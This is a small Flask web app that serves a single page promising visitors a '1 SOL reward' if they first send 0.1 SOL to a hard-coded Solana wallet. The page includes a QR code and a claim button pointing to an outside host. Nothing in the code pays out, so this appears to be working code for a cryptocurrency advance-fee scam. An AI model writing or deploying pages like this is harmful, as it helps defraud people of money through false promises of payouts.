from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"
CLAIM_URL = "https://coinupdater-bot-zvs8iw.fly.dev"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>CoinUpdater - Claim Reward</title>
  <style>
    body {
      background-color: #000000;
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      text-align: center;
      padding: 40px;
      margin: 0;
    }
    h1 {
      font-size: 2.8rem;
      margin-bottom: 0.5rem;
    }
    p.wallet {
      font-size: 1.3rem;
      margin: 1rem 0 3rem;
      letter-spacing: 1.2px;
      word-break: break-all;
    }
    img.qr {
      width: 250px;
      height: 250px;
      border-radius: 20px;
      box-shadow: 0 0 15px #00ff90;
      margin-bottom: 3rem;
    }
    a.claim-button {
      display: inline-block;
      background: linear-gradient(90deg, #00ff90, #00d178);
      color: #000;
      font-weight: bold;
      font-size: 1.4rem;
      padding: 15px 45px;
      border-radius: 40px;
      text-decoration: none;
      box-shadow: 0 4px 20px #00ff90aa;
      transition: all 0.3s ease;
    }
    a.claim-button:hover {
      background: linear-gradient(90deg, #00d178, #00ff90);
      box-shadow: 0 6px 30px #00ff90ff;
    }
    footer {
      margin-top: 5rem;
      font-size: 0.9rem;
      color: #444;
    }
  </style>
</head>
<body>
  <h1>Claim Your 1 SOL Reward!</h1>
  <p class="wallet">Send 0.1 SOL to wallet:<br><strong>{{ wallet }}</strong></p>
  <img src="{{ qr_url }}" alt="QR Code" class="qr" />
  <br />
  <a href="{{ claim_url }}" class="claim-button" target="_blank" rel="noopener noreferrer">
    Claim 1 SOL Reward
  </a>

  <footer>
    &copy; 2025 CoinUpdater Bot
  </footer>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(
        HTML_TEMPLATE,
        wallet=WALLET_ADDRESS,
        qr_url=QR_CODE_URL,
        claim_url=CLAIM_URL
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
